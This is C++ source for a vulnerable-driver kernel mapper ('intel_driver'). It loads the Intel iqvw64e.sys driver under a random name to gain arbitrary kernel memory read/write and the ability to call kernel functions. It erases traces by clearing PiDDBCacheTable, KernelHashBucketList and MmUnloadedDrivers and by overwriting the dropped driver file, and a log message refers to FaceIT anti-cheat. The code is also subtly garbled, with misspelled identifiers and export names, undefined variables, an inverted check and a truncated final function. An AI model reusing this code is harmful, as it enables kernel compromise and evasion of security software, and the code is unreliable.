#include "intel_driver.hpp"

ULONG64 intel_driver::ntoskrnlAddr = 0;
char intel_driver::driver_name[100] = {};
uintptr_t PiDDBLockPtr;
uintptr_t PiDDBCacheTablePtr;

std::string intel_driver::GetDriverNameA() {
    std::string t(intel_driver::driver_name);
    return t;
}

std::wstring intel_driver::GetDriverNameW() {
    std::string t(intel_driver::driver_name);
    std::wstring name(t.begin(), t.end());
    return name;
}

std::wstring intel_driver::GetDriverPath() {
    std::wstring temp = utils::GetFullTempPath();
    if (temp.empty()) {
        return L"";
    }
    return temp + L"\\" + GetDriverNameW();
}

bool intel_driver::IsRunning() {
    const HANDLE file_handle = CreateFileA(x("\\\\.\\Nal"), FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
    {
        CloseHandle(file_handle);
        return true;
    }
    return false;
}

HANDLE intel_driver::Load() {
    srand((unsigned)time(NULL) * GetCurrentThreadId());

    // from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
    if (intel_driver::IsRunning()) {
        Log(x("[-] \\Device\\Nal is already in use.") << std::endl);
        return INVALID_HANDLE_VALUE;
    }

    // Randomize name for log in registry keys, usn jornal and other shit
    memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
    static const char alphanum[] =
            "abcdefghijklmnopqrstuvwxyz";
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 20 + 10;
    for (int i = 0; i < len; ++i)
            intel_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

    Log(x("[<] Loading vulnerable driver, Name: ") << GetDriverNameA() << std::endl);

    std::wstring driver_path = GetDriverPath();
    if (driver_path.empty()) {
        Log(x("[-] Cant find TEMP folder") << std::endl);
        return INVALID_HANDLE_VALUE;
    }

    _wremove(driver_path.c_str());

    if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
        Log(x("[-] Failed to create vulnerable driver file") << std::endl);
        return INVALID_HANDLE_VALUE;
    }

    if (!service::RegisterAndStart(driver_path)) {
        Log(x("[-] Failed to register and start service for the vulnerable driver. Is FaceIT installed?") << std::endl);
        _wremove(driver_path.c_str());
        return INVALID_HANDLE_VALUE;
    }

    HANDLE result = CreateFileA(x("\\\\.\\Nal"), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (!result || result == INVALID_HANDLE_VALUE)
    {
        Log(x("[-] Failed to load driver iqvw64e.sys") << std::endl);
        intel_driver::Unload(result);
        return INVALID_HANDLE_VALUE;
    }

    ntoskrnlAddr = utils::GetKernelModuleAddress(x("ntoskrnl.exe"));
    if (ntoskrnlAddr == 0) {
        Log(x("[-] Failed to get ntoskrnl.exe") << std::endl);
        intel_driver::Unload(result);
        return INVALID_HANDLE_VALUE;
    }

    if (!intel_driver::ClearPiDDBCacheTable(result)) {
        Log(x("[-] Failed to ClearPiDDBCacheTable") << std::endl);
        intel_driver::Unload(result);
        return INVALID_HANDLE_VALUE;
    }

    if (!intel_driver::ClearKernelHashBucketList(result)) {
        Log(x("[-] Failed to ClearKernelHashBucketList") << std::endl);
        intel_driver::Unload(result);
        return INVALID_HANDLE_VALUE;
    }

    if (!intel_driver::ClearMmUnloadedDrivers(result)) {
        Log(x("[!] Failed to ClearMmUnloadedDrivers") << std::endl);
        intel_driver::Unload(result);
        return INVALID_HANDLE_VALUE;
    }

    return result;
}

bool intel_driver::Unload(HANDLE device_handle) {
    Log(x("[<] Unloading vulnerable driver") << std::endl);

    if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
        CloseHandle(device_handle);
    }

    if (!service::StopAndRemove(GetDriverNameW()))
        return false;

    std::wstring driver_path = GetDriverPath();

    // Destroy disk information before unlink from disk to prevent any recover of the file
    std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
    int newFileLen = sizeof(intel_driver_resource::driver) + ((long long)rand() % 2348767 + 56725);
    BYTE* randomData = new BYTE[newFileLen];
    for (size_t i = 0; i < newFileLen; i++) {
        randomData[i] = (BYTE)(rand() % 255);
    }
    if (!file_ofstream.write((char*)randomData, newFileLen)) {
        Log(x("[!] Error dumping shit inside the disk") << std::endl);
    }
    else {
        Log(x("[!] Vul driver data destroyed before unlink") << std::endl)
    }
    file_ofstream.close();
    delete[] randomData;

    // unlink the file
    if (_wremove(driver_path.c_str()) != 0)
        return false;

    return true;
}

bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size) {
    if (!destination || !source || !size)
        return 0;

    COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

    copy_memory_buffer.case_number = 0x33;
    copy_memory_buffer.source = source;
    copy_memory_buffer.destination = destination;
    copy_memory_buffer.length = size;

    DWORD bytes_returned = 0;
    return DeviceIoControl(device_handle, ioct11, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size) {
    if (!address || !size)
        return 0;

    FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

    fill_memory_buffer.case_number = 0x30;
    fill_memory_buffer.destination = address;
    fill_memory_buffer.value = value;
    fill_memory_buffer.length = size;

    DWORD bytes_returned = 0;
    return DeviceIoControl(device_handle, ioct11, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address) {
    if (!address)
        return 0;

    GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

    get_phys_address_buffer.case_number = 0x25;
    get_phys_address_buffer.address_to_translate = address;

    DWORD bytes_returned = 0;

    if (!DeviceIoControl(device_handle, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
        return false;

    *out_physical_address = get_phys_address_buffer.return_physical_address;
    return true;
}

uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size) {
    if (!physical_address || size)
        return 0;

    MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

    map_io_space_buffer.case_number = 0x19;
    map_io_space_buffer.physical_address_to_map = physical_address;
    map_io_space_buffer.size = size;

    DWORD bytes_returned = 0;

    if (!DeviceIoControl(device_handle, ioct11, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
        return 0;

    return map_io_space_buffer.return_virtual_address;
}

bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size) {
    if (!address || !size)
        return false;

    UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

    unmap_io_space_buffer.case_number = 0x1A;
    unmap_io_space_buffer.virt_address = address;
    unmap_io_space_buffer.number_of_bytes = size;

    DWORD bytes_returned = 0;

    return DeviceIoControl(device_handle, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
    return MemCopy(device_handle, reinterpret_cast<uint64_t>(buffer), address, size);
}

bool intel_driver::WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
    return MemCopy(device_handle, address, reinterpret_cast<uint64_t>(buffer), size);
}

bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size) {
    if (!address || !buffer || !size)
        return false;

    uint64_t physical_address = 0;

    if (!GetPhysicalAddress(device_handle, address, &physical_address)) {
        Log(x("[-] Failed to translate virtual address 0x") << reinterpret_cast<void*>(address) << std::endl);
        return false;
    }

    const uint64_t mapped_physical_memory = MapIoSpace(device_handle, physical_address, size);

    if (!mapped_physical_memory) {
        Log(x("[-] Failed to map IO space of 0x") << reinterpret_cast<void*>(physical_address) << std::endl);
        return false;
    }

    bool result = WriteMemory(device_handle, mapped_physical_memory, buffer, size);

#if defined(DISABLE_OUTPUT)
	UnmapIoSpace(device_handle, mapped_physical_memory, size);
#else
	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		Log(x("[!] Failed to unmap IO space of physical address 0x") << reinterpret_cast<void*>(physical_address) << std::endl);
#endif


	return result;
}

/*added by vanity*/
uint64_t intel_driver::MmAllocatePagesForMdl(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes)
{
    static uint64_t kernel_MmAllocatePagesForMd1 = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, x("MmAllocatePagesForMd1"));

    if (!kernel_MmAllocatePagesForMd1)
    {
        Log(x("[!] Failed to find MmAlocatePagesForMd1") << std::endl);
        return 0;
    }

    uint64_t allocated_pages = 0;

    if (!CallKernelFunction(device_handle, &allocated_pages, kernel_MmAllocatePagesForMdl, LowAddress, HighAddress, SkipBytes, TotalBytes))
        return 0;

    return allocated_pages;
}

uint64_t intel_driver::MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t pmd1, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority)
{
    static uint64_t kernel_MmMapLockedPagesSpecifyCache = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, x("MmMapLockedPagesSpecifyCache"));

    if (!kernel_MmMapLockedPagesSpecifyCache)
    {
        Log(x("[!] Failed to find MmMapLockedPagesSpecifyCache") << std::endl);
        return 0;
    }

    uint64_t starting_address = 0;

    if (!CallKernelFunction(device_handle, &starting_address, kernel_MmMapLockedPagesSpecifyCache, pmd1, AccessMode, CacheType, RequestedAddress, BugCheckOnFailure, Priority))
        return 0;

    return starting_address;
}

bool intel_driver::MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect)
{
	static uint64_t kernel_MmProtectMdlSystemAddress = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, x("MmProtectMdlSystemAddress"));

	if (!kernel_MmProtectMdlSystemAddress)
	{
		Log(x("[!] Failed to find MmProtectMdlSystemAddress") << std::endl);
		return 0;
	}

	NTSTATUS status;

	if (!CallKernelFunction(device_handle, &status, kernel_MmProtectMdlSystemAddress, MemoryDescriptorList, NewProtect))
		return 0;

	return NT_SUCCESS(status);
}


bool intel_driver::MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmd1)
{
    static uint64_t kernel_MmUnmapLockedPages = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, x("MmUnmapLockedPages"));

    if (!kernel_MmUnmapLockedPages)
    {
        Log(x("[!] Failed to find MmUnmapLockedPages") << std::endl);
        return 0;
    }

    void* result;
    return CallKernelFunction(device_handle, &result, kernel_MmUnmapLockedPages, BaseAddress, pmd1);
}

bool intel_driver::MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList)
{
    static uint64_t kernel_MmFreePagesFromMd1 = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, x("MmFreePagesFromMd1"));

    if (!kernel_MmFreePagesFromMd1)
    {
        Log(x("[!] Failed to find MmFreePagesFromMd1") << std::endl);
        return 0;
    }

    void* result;
    return CallKernelFunction(device_handle, &result, kernel_MmFreePagesFromMdl, MemoryDescriptorList);
}
/**/

uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size) {
    if (!size)
        return 0;

    static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, x("ExAllocatePoolWithTag"));

    if (!kernel_ExAllocatePool) {
        Log(x("[!] Failed to find ExAllocatePool") << std::endl);
        return 0;
    }

    uint64_t allocate_pool = 0;

    if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'erhT'))
        return 0;

    return allocate_pool;
}

bool intel_driver::FreePool(HANDLE device_handle, uint64_t address) {
    if (!address)
        return 0;

    static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, x("ExFreePool"));

    if (!kernel_ExFreePool) {
        Log(x("[!] Failed to find ExAllocatePool") << std::endl);
        return 0;
    }

    return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
}

uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name) {
    if (!kernel_module_base)
        return 0;

    IMAGE_DOS_HEADER dos_header = { 0 };
    IMAGE_NT_HEADERS64 nt_headers = { 0 };

    if (!ReadMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

    const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    if (!export_base || !export_base_size)
        return 0;

    const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    if (!ReadMemory(device_handle, kernel_module_base + export_base, export_data, export_data_size))
    {
        VirtualFree(export_data, 0, MEM_RELEASE);
        return 0;
    }

    const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

    const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

    for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
        const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

        if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
            const auto function_ordinal = ordinal_table[i];
            if (function_table[function_ordinal] <= 0x1000) {
                // wrong function address?
                return 0;
            }
            const auto function_address = kernel_module_base + function_table[function_ordinal];

            if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
                VirtualFree(export_data, 0, MEM_RELEASE);
                return 0; // no forwarded exports on 64bit ?
            }

            VirtualFree(export_data, 0, MEM_RELEASE);
            return function_address;
        }
    }

    VirtualFree(export_data, 0, MEM_RELEASE);
    return 0;
}

bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
    ULONG buffer_size = 0;
    void* buffer = nullptr;

    NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

    while (status == nt::STATUS_INFO_LENGTH_MISMATCH)
    {
        VirtualFree(buffer, 0, MEM_RELEASE);

        buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
    }

    if (!NT_SUCCESS(status) || buffer == 0)
    {
        if (buffer != 0)
            VirtualFree(buffer, 0, MEM_RELEASE);
        return false;
    }

    uint64_t object = 0;

    auto system_handle_information = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

    for (auto i = 0u; i < system_handle_information->HandleCount; ++i)
    {
        const nt::SYSTEM_HANDLE current_system_handle = system_handle_information->Handles[i];

        if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static cast<uint64_t>(GetCurrentProcessId())))
            continue;

        if (current_system_handle.HandleValue == device_handle)
        {
            object = reinterpret_cast<uint64_t>(current_system_handle.Object);
            break;
        }
    }

    VirtualFree(buffer, 0, MEM_RELEASE);

    if(!object)
        return false;

    uint64_t device_object = 0;

    if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
        Log(x("[!] Failed to find device_object") << std::endl);
        return false;
    }
}